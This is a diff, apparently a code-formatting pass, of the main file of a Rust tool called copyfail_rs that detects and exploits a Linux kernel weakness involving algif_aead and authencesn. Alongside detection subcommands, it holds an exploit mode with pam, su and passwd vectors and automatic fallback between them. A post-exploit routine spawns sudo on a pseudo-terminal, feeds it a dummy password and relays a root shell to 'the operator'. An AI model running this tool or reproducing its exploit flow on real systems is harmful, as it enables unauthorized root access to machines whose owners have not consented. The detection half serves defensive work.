@@ -4,12 +4,14 @@
 use copyfail_rs::detect::baseline::{diff_baseline, write_baseline};
 use copyfail_rs::detect::check::{run_check_with_sources, CheckSources, Verdict};
 use copyfail_rs::detect::hunt::run_hunt;
-use copyfail_rs::detect::output::{check_human, check_json, diff_human, scan_human, scan_json, OUT_BUF};
+use copyfail_rs::detect::output::{
+    check_human, check_json, diff_human, scan_human, scan_json, OUT_BUF,
+};
 use copyfail_rs::detect::scan::{default_paths, run_scan};
 use copyfail_rs::detect::watch::run_watch;
 use copyfail_rs::orchestrator::{self, AttemptOutcome, RunReport};
 use copyfail_rs::post_exploit::{decide_post_action, PostAction, PAM_BYPASS_HINT};
-use copyfail_rs::vectors::{passwd::PasswdVector, pam::PamVector, su::SuVector};
+use copyfail_rs::vectors::{pam::PamVector, passwd::PasswdVector, su::SuVector};
 use copyfail_rs::{check_kernel, CopyFail, Error, Vector};
 use core::ffi::CStr;
 use heapless::String;
@@ -57,19 +59,47 @@ pub extern "C" fn main(argc: i32, argv: *const *const u8) -> i32 {
         Cmd::Check => run_check(),
         Cmd::Exploit => run_exploit(&args),
         Cmd::Detect => run_detect(&args),
-        Cmd::Help => { write_stderr(USAGE); 0 }
-        Cmd::Bad => { write_stderr(USAGE); 2 }
+        Cmd::Help => {
+            write_stderr(USAGE);
+            0
+        }
+        Cmd::Bad => {
+            write_stderr(USAGE);
+            2
+        }
     }
 }
 
 #[derive(Clone, Copy)]
-enum Cmd { Check, Exploit, Detect, Help, Bad }
+enum Cmd {
+    Check,
+    Exploit,
+    Detect,
+    Help,
+    Bad,
+}
 
 #[derive(Clone, Copy, PartialEq, Eq)]
-enum VectorChoice { None, Pam, Su, Passwd, Auto, All, List }
+enum VectorChoice {
+    None,
+    Pam,
+    Su,
+    Passwd,
+    Auto,
+    All,
+    List,
+}
 
 #[derive(Clone, Copy, PartialEq, Eq)]
-enum DetectSub { None, Check, Scan, Baseline, Diff, Watch, Hunt }
+enum DetectSub {
+    None,
+    Check,
+    Scan,
+    Baseline,
+    Diff,
+    Watch,
+    Hunt,
+}
 
 struct Args {
     cmd: Cmd,
@@ -125,7 +155,10 @@ impl Args {
                 }
             } else if cstr_eq(arg, b"--mode\0") {
                 i += 1;
-                if (i as i32) >= argc { a.cmd = Cmd::Bad; return a; }
+                if (i as i32) >= argc {
+                    a.cmd = Cmd::Bad;
+                    return a;
+                }
                 let m = *argv.offset(i);
                 if cstr_eq(m, b"exploit\0") {
                     a.cmd = Cmd::Exploit;
@@ -137,26 +170,44 @@ impl Args {
                 }
             } else if cstr_eq(arg, b"--vector\0") {
                 i += 1;
-                if (i as i32) >= argc { a.cmd = Cmd::Bad; return a; }
+                if (i as i32) >= argc {
+                    a.cmd = Cmd::Bad;
+                    return a;
+                }
                 let v = *argv.offset(i);
-                a.vector = if cstr_eq(v, b"pam\0") { VectorChoice::Pam }
-                    else if cstr_eq(v, b"su\0") { VectorChoice::Su }
-                    else if cstr_eq(v, b"passwd\0") { VectorChoice::Passwd }
-                    else if cstr_eq(v, b"auto\0") { VectorChoice::Auto }
-                    else if cstr_eq(v, b"all\0") { VectorChoice::All }
-                    else if cstr_eq(v, b"list\0") { VectorChoice::List }
-                    else { a.cmd = Cmd::Bad; return a; };
+                a.vector = if cstr_eq(v, b"pam\0") {
+                    VectorChoice::Pam
+                } else if cstr_eq(v, b"su\0") {
+                    VectorChoice::Su
+                } else if cstr_eq(v, b"passwd\0") {
+                    VectorChoice::Passwd
+                } else if cstr_eq(v, b"auto\0") {
+                    VectorChoice::Auto
+                } else if cstr_eq(v, b"all\0") {
+                    VectorChoice::All
+                } else if cstr_eq(v, b"list\0") {
+                    VectorChoice::List
+                } else {
+                    a.cmd = Cmd::Bad;
+                    return a;
+                };
             } else if cstr_eq(arg, b"--scan\0") && matches!(a.cmd, Cmd::Detect) {
                 a.detect_sub = DetectSub::Scan;
             } else if cstr_eq(arg, b"--baseline\0") && matches!(a.cmd, Cmd::Detect) {
                 a.detect_sub = DetectSub::Baseline;
                 i += 1;
-                if (i as i32) >= argc { a.cmd = Cmd::Bad; return a; }
+                if (i as i32) >= argc {
+                    a.cmd = Cmd::Bad;
+                    return a;
+                }
                 a.file_arg = *argv.offset(i);
             } else if cstr_eq(arg, b"--diff\0") && matches!(a.cmd, Cmd::Detect) {
                 a.detect_sub = DetectSub::Diff;
                 i += 1;
-                if (i as i32) >= argc { a.cmd = Cmd::Bad; return a; }
+                if (i as i32) >= argc {
+                    a.cmd = Cmd::Bad;
+                    return a;
+                }
                 a.file_arg = *argv.offset(i);
             } else if cstr_eq(arg, b"--watch\0") && matches!(a.cmd, Cmd::Detect) {
                 a.detect_sub = DetectSub::Watch;
@@ -164,21 +215,33 @@ impl Args {
                 a.detect_sub = DetectSub::Hunt;
             } else if cstr_eq(arg, b"--hosts\0") {
                 i += 1;
-                if (i as i32) >= argc { a.cmd = Cmd::Bad; return a; }
+                if (i as i32) >= argc {
+                    a.cmd = Cmd::Bad;
+                    return a;
+                }
                 a.file_arg = *argv.offset(i);
             } else if cstr_eq(arg, b"--interval\0") {
                 i += 1;
-                if (i as i32) >= argc { a.cmd = Cmd::Bad; return a; }
+                if (i as i32) >= argc {
+                    a.cmd = Cmd::Bad;
+                    return a;
+                }
                 a.interval_secs = parse_u32(*argv.offset(i));
             } else if cstr_eq(arg, b"--target\0") {
                 // Reserved for passwd vector. Trait does not accept options
                 // in S4; consumed here so the flag doesn't fall through to
                 // extra_paths and parsing doesn't fail.
                 i += 1;
-                if (i as i32) >= argc { a.cmd = Cmd::Bad; return a; }
+                if (i as i32) >= argc {
+                    a.cmd = Cmd::Bad;
+                    return a;
+                }
             } else if cstr_eq(arg, b"--shell\0") {
                 i += 1;
-                if (i as i32) >= argc { a.cmd = Cmd::Bad; return a; }
+                if (i as i32) >= argc {
+                    a.cmd = Cmd::Bad;
+                    return a;
+                }
             } else if cstr_eq(arg, b"--json\0") {
                 a.json = true;
             } else if cstr_eq(arg, b"--strict\0") {
@@ -211,9 +274,15 @@ unsafe fn cstr_eq(p: *const u8, b: &[u8]) -> bool {
     let mut i = 0;
     loop {
         let c = *p.add(i);
-        if i >= b.len() { return c == 0 && b.last() == Some(&0); }
-        if c != b[i] { return false; }
-        if c == 0 && b[i] == 0 { return true; }
+        if i >= b.len() {
+            return c == 0 && b.last() == Some(&0);
+        }
+        if c != b[i] {
+            return false;
+        }
+        if c == 0 && b[i] == 0 {
+            return true;
+        }
         i += 1;
     }
 }
@@ -223,8 +292,12 @@ unsafe fn parse_u32(p: *const u8) -> u32 {
     let mut i = 0;
     loop {
         let c = *p.add(i);
-        if c == 0 { break; }
-        if !c.is_ascii_digit() { return 0; }
+        if c == 0 {
+            break;
+        }
+        if !c.is_ascii_digit() {
+            return 0;
+        }
         n = n.saturating_mul(10).saturating_add((c - b'0') as u32);
         i += 1;
     }
@@ -238,10 +311,20 @@ fn run_check() -> i32 {
             write_stderr(b"  kernel: ");
             write_stderr(&s.osrelease[..s.osrelease_len]);
             write_stderr(b"\n  algif_aead module:        ");
-            write_stderr(if s.algif_aead_module { b"present" } else { b"not in /proc/modules (may be builtin)" });
+            write_stderr(if s.algif_aead_module {
+                b"present"
+            } else {
+                b"not in /proc/modules (may be builtin)"
+            });
             write_stderr(b"\n  authencesn template:      ");
-            write_stderr(if s.authencesn_template { b"present in /proc/crypto" } else { b"NOT present in /proc/crypto" });
-            write_stderr(b"\n  hint:                     run `--mode detect --check` for full verdict\n");
+            write_stderr(if s.authencesn_template {
+                b"present in /proc/crypto"
+            } else {
+                b"NOT present in /proc/crypto"
+            });
+            write_stderr(
+                b"\n  hint:                     run `--mode detect --check` for full verdict\n",
+            );
             0
         }
         Err(_) => {
@@ -332,14 +415,20 @@ fn emit_list_human(plan: &[orchestrator::PlanEntry], host_vuln: bool) {
         write_stdout(b"\n");
     }
     write_stdout(b"\nKernel vulnerable: ");
-    write_stdout(if host_vuln { b"yes" } else { b"no (run `--mode detect --check` for the full verdict)" });
+    write_stdout(if host_vuln {
+        b"yes"
+    } else {
+        b"no (run `--mode detect --check` for the full verdict)"
+    });
     write_stdout(b"\n");
     // Spec: Recommended order line.
     write_stdout(b"Recommended order (auto): ");
     let mut first = true;
     for e in plan {
         if e.applicable {
-            if !first { write_stdout(b" \xe2\x86\x92 "); }
+            if !first {
+                write_stdout(b" \xe2\x86\x92 ");
+            }
             write_stdout(e.name.as_bytes());
             first = false;
         }
@@ -351,12 +440,16 @@ fn emit_list_human(plan: &[orchestrator::PlanEntry], host_vuln: bool) {
 }
 
 fn emit_list_json(plan: &[orchestrator::PlanEntry], host_vuln: bool) {
-    write_stdout(b"{\"mode\":\"exploit\",\"vector_requested\":\"list\",\"host\":{\"kernel_vulnerable\":");
+    write_stdout(
+        b"{\"mode\":\"exploit\",\"vector_requested\":\"list\",\"host\":{\"kernel_vulnerable\":",
+    );
     write_stdout(if host_vuln { b"true" } else { b"false" });
     write_stdout(b"},\"vectors\":[");
     let mut first = true;
     for e in plan {
-        if !first { write_stdout(b","); }
+        if !first {
+            write_stdout(b",");
+        }
         first = false;
         write_stdout(b"{\"name\":\"");
         write_stdout(e.name.as_bytes());
@@ -552,7 +645,11 @@ fn run_all(args: &Args) -> i32 {
             // exit 5 only happens with --strict + prior failure: still
             // drop the shell so the operator gets the bypass, then exit 5.
             let post_exit = post_exploit_dispatch(args, name);
-            if exit == 5 { 5 } else { post_exit }
+            if exit == 5 {
+                5
+            } else {
+                post_exit
+            }
         }
         _ => {
             if !args.json {
@@ -576,11 +673,17 @@ fn emit_run_json(args: &Args, report: &RunReport) {
         None => write_stdout(b"null"),
     }
     write_stdout(b",\"outcome\":\"");
-    write_stdout(if report.success.is_some() { b"success" } else { b"failure" });
+    write_stdout(if report.success.is_some() {
+        b"success"
+    } else {
+        b"failure"
+    });
     write_stdout(b"\",\"fallback_chain\":[");
     let mut first = true;
     for a in report.attempts.iter() {
-        if !first { write_stdout(b","); }
+        if !first {
+            write_stdout(b",");
+        }
         first = false;
         write_stdout(b"{\"name\":\"");
         write_stdout(a.name.as_bytes());
@@ -639,36 +742,34 @@ fn drop_root_shell_via_sudo() -> i32 {
     let mut orig_termios: libc::termios = unsafe { core::mem::zeroed() };
     let saved = unsafe { libc::tcgetattr(0, &mut orig_termios) } == 0;
 
-    let master = unsafe {
-        libc::open(c"/dev/ptmx".as_ptr(), libc::O_RDWR | libc::O_NOCTTY)
-    };
+    let master = unsafe { libc::open(c"/dev/ptmx".as_ptr(), libc::O_RDWR | libc::O_NOCTTY) };
     if master < 0 {
         write_stderr(b"pam: open(/dev/ptmx) failed\n");
         return 1;
     }
     if unsafe { libc::grantpt(master) } != 0 || unsafe { libc::unlockpt(master) } != 0 {
-        unsafe { libc::close(master); }
+        unsafe {
+            libc::close(master);
+        }
         write_stderr(b"pam: grantpt/unlockpt failed\n");
         return 1;
     }
 
     let mut slave_name = [0u8; 128];
-    if unsafe {
-        libc::ptsname_r(
-            master,
-            slave_name.as_mut_ptr() as *mut _,
-            slave_name.len(),
-        )
-    } != 0
+    if unsafe { libc::ptsname_r(master, slave_name.as_mut_ptr() as *mut _, slave_name.len()) } != 0
     {
-        unsafe { libc::close(master); }
+        unsafe {
+            libc::close(master);
+        }
         write_stderr(b"pam: ptsname_r failed\n");
         return 1;
     }
 
     let pid = unsafe { libc::fork() };
     if pid < 0 {
-        unsafe { libc::close(master); }
+        unsafe {
+            libc::close(master);
+        }
         write_stderr(b"pam: fork failed\n");
         return 1;
     }
@@ -710,16 +811,30 @@ fn drop_root_shell_via_sudo() -> i32 {
 
     if saved {
         let mut raw = orig_termios;
-        unsafe { libc::cfmakeraw(&mut raw); }
-        unsafe { libc::tcsetattr(0, libc::TCSANOW, &raw); }
+        unsafe {
+            libc::cfmakeraw(&mut raw);
+        }
+        unsafe {
+            libc::tcsetattr(0, libc::TCSANOW, &raw);
+        }
     }
 
     let pw = b"any\n";
-    unsafe { libc::write(master, pw.as_ptr() as *const _, pw.len()); }
+    unsafe {
+        libc::write(master, pw.as_ptr() as *const _, pw.len());
+    }
 
     let mut fds = [
-        libc::pollfd { fd: 0, events: libc::POLLIN, revents: 0 },
-        libc::pollfd { fd: master, events: libc::POLLIN, revents: 0 },
+        libc::pollfd {
+            fd: 0,
+            events: libc::POLLIN,
+            revents: 0,
+        },
+        libc::pollfd {
+            fd: master,
+            events: libc::POLLIN,
+            revents: 0,
+        },
     ];
     let mut buf = [0u8; 4096];
     'relay: loop {
@@ -739,7 +854,9 @@ fn drop_root_shell_via_sudo() -> i32 {
                     let w = unsafe {
                         libc::write(master, buf.as_ptr().add(off) as *const _, n as usize - off)
                     };
-                    if w <= 0 { break 'relay; }
+                    if w <= 0 {
+                        break 'relay;
+                    }
                     off += w as usize;
                 }
             } else {
@@ -754,7 +871,9 @@ fn drop_root_shell_via_sudo() -> i32 {
                     let w = unsafe {
                         libc::write(1, buf.as_ptr().add(off) as *const _, n as usize - off)
                     };
-                    if w <= 0 { break 'relay; }
+                    if w <= 0 {
+                        break 'relay;
+                    }
                     off += w as usize;
                 }
             } else {
@@ -764,13 +883,17 @@ fn drop_root_shell_via_sudo() -> i32 {
         if fds[1].revents & (libc::POLLHUP | libc::POLLERR) != 0 {
             loop {
                 let n = unsafe { libc::read(master, buf.as_mut_ptr() as *mut _, buf.len()) };
-                if n <= 0 { break; }
+                if n <= 0 {
+                    break;
+                }
                 let mut off = 0usize;
                 while off < n as usize {
                     let w = unsafe {
                         libc::write(1, buf.as_ptr().add(off) as *const _, n as usize - off)
                     };
-                    if w <= 0 { break; }
+                    if w <= 0 {
+                        break;
+                    }
                     off += w as usize;
                 }
             }
@@ -779,12 +902,18 @@ fn drop_root_shell_via_sudo() -> i32 {
     }
 
     let mut status: i32 = 0;
-    unsafe { libc::waitpid(pid, &mut status, 0); }
+    unsafe {
+        libc::waitpid(pid, &mut status, 0);
+    }
 
     if saved {
-        unsafe { libc::tcsetattr(0, libc::TCSANOW, &orig_termios); }
+        unsafe {
+            libc::tcsetattr(0, libc::TCSANOW, &orig_termios);
+        }
     }
-    unsafe { libc::close(master); }
+    unsafe {
+        libc::close(master);
+    }
 
     if libc::WIFEXITED(status) {
         libc::WEXITSTATUS(status)
@@ -803,7 +932,10 @@ fn run_detect(args: &Args) -> i32 {
         DetectSub::Diff => detect_diff(args),
         DetectSub::Watch => detect_watch(args),
         DetectSub::Hunt => detect_hunt(args),
-        DetectSub::None => { write_stderr(USAGE); 2 }
+        DetectSub::None => {
+            write_stderr(USAGE);
+            2
+        }
     }
 }
 
@@ -815,7 +947,9 @@ fn detect_check(json: bool, strict: bool) -> i32 {
     let mut path_buf: [u8; 192] = [0u8; 192];
     let prefix = b"/boot/config-";
     let kernel = &kr.osrelease[..kr.osrelease_len];
-    if prefix.len() + kernel.len() + 1 > path_buf.len() { return 1; }
+    if prefix.len() + kernel.len() + 1 > path_buf.len() {
+        return 1;
+    }
     path_buf[..prefix.len()].copy_from_slice(prefix);
     path_buf[prefix.len()..prefix.len() + kernel.len()].copy_from_slice(kernel);
     let boot_cstr = match CStr::from_bytes_until_nul(&path_buf) {
@@ -836,10 +970,18 @@ fn detect_check(json: bool, strict: bool) -> i32 {
     };
 
     let mut out: String<OUT_BUF> = String::new();
-    if json { check_json(&report, &mut out); } else { check_human(&report, &mut out); }
+    if json {
+        check_json(&report, &mut out);
+    } else {
+        check_human(&report, &mut out);
+    }
     write_stdout(out.as_bytes());
 
-    if strict && matches!(report.verdict, Verdict::Vulnerable) { 4 } else { 0 }
+    if strict && matches!(report.verdict, Verdict::Vulnerable) {
+        4
+    } else {
+        0
+    }
 }
 
 fn detect_scan(args: &Args) -> i32 {
@@ -864,14 +1006,25 @@ fn detect_scan(args: &Args) -> i32 {
     };
 
     let mut out: String<OUT_BUF> = String::new();
-    if args.json { scan_json(&report, &mut out); } else { scan_human(&report, &mut out); }
+    if args.json {
+        scan_json(&report, &mut out);
+    } else {
+        scan_human(&report, &mut out);
+    }
     write_stdout(out.as_bytes());
 
-    if args.strict && report.any_tampered() { 4 } else { 0 }
+    if args.strict && report.any_tampered() {
+        4
+    } else {
+        0
+    }
 }
 
 fn detect_baseline(args: &Args) -> i32 {
-    if args.file_arg.is_null() { write_stderr(USAGE); return 2; }
+    if args.file_arg.is_null() {
+        write_stderr(USAGE);
+        return 2;
+    }
     let out_cstr = unsafe { CStr::from_ptr(args.file_arg as *const _) };
 
     let mut paths: heapless::Vec<&CStr, 64> = heapless::Vec::new();
@@ -895,19 +1048,29 @@ fn detect_baseline(args: &Args) -> i32 {
             write_stderr(b" entries\n");
             0
         }
-        Err(_) => { write_stderr(b"baseline: write failed\n"); 1 }
+        Err(_) => {
+            write_stderr(b"baseline: write failed\n");
+            1
+        }
     }
 }
 
 fn detect_diff(args: &Args) -> i32 {
-    if args.file_arg.is_null() { write_stderr(USAGE); return 2; }
+    if args.file_arg.is_null() {
+        write_stderr(USAGE);
+        return 2;
+    }
     let in_cstr = unsafe { CStr::from_ptr(args.file_arg as *const _) };
     match diff_baseline(in_cstr) {
         Ok(diffs) => {
             let mut out: String<OUT_BUF> = String::new();
             diff_human(&diffs, &mut out);
             write_stdout(out.as_bytes());
-            if args.strict && !diffs.is_empty() { 4 } else { 0 }
+            if args.strict && !diffs.is_empty() {
+                4
+            } else {
+                0
+            }
         }
         Err(_) => 1,
     }
@@ -918,7 +1081,11 @@ fn detect_watch(args: &Args) -> i32 {
     for cstr in default_paths().iter() {
         let _ = paths.push(*cstr);
     }
-    let interval = if args.interval_secs == 0 { 60 } else { args.interval_secs };
+    let interval = if args.interval_secs == 0 {
+        60
+    } else {
+        args.interval_secs
+    };
     match run_watch(&paths, interval) {
         Ok(_) => 0,
         Err(_) => 1,
@@ -926,7 +1093,10 @@ fn detect_watch(args: &Args) -> i32 {
 }
 
 fn detect_hunt(args: &Args) -> i32 {
-    if args.file_arg.is_null() { write_stderr(USAGE); return 2; }
+    if args.file_arg.is_null() {
+        write_stderr(USAGE);
+        return 2;
+    }
     let cstr = unsafe { CStr::from_ptr(args.file_arg as *const _) };
     match run_hunt(cstr) {
         Ok(_) => 0,
@@ -937,14 +1107,20 @@ fn detect_hunt(args: &Args) -> i32 {
 // ----- Output helpers -----------------------------------------------------
 
 #[allow(dead_code)]
-fn err_code(_e: Error) -> i32 { 1 }
+fn err_code(_e: Error) -> i32 {
+    1
+}
 
 fn write_stderr(b: &[u8]) {
-    unsafe { libc::write(2, b.as_ptr() as *const _, b.len()); }
+    unsafe {
+        libc::write(2, b.as_ptr() as *const _, b.len());
+    }
 }
 
 fn write_stdout(b: &[u8]) {
-    unsafe { libc::write(1, b.as_ptr() as *const _, b.len()); }
+    unsafe {
+        libc::write(1, b.as_ptr() as *const _, b.len());
+    }
 }
 
 fn write_num(n: usize) {
